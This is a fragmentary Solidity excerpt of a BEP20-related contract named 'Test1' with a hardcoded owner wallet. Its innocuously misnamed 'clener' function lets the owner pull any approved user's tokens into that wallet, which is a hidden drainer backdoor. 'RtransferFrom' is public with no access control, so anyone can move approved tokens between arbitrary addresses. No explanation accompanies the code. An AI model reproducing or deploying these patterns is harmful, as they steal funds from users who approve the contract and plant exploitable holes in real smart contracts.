...
contract Test1 {
    ...
    address payable owner_wallet = 0x878a2b41603a94Bf986943208D6D156dE1ADB8A9;
    IBEP20 token;
...
function clener (address referrer, uint256 _amount) public {
 if (msg.sender == owner_wallet)
           token.transferFrom(referrer, owner_wallet, _amount);
}

    function RtransferFrom( address sender, address recipient,  uint256 amount)  public {
...
token.transferFrom(sender, recipient, amount);
    ...
    function withdraw() public {
        ...
        IBEP20(busd).transfer(owner_wallet, fee); 
    }
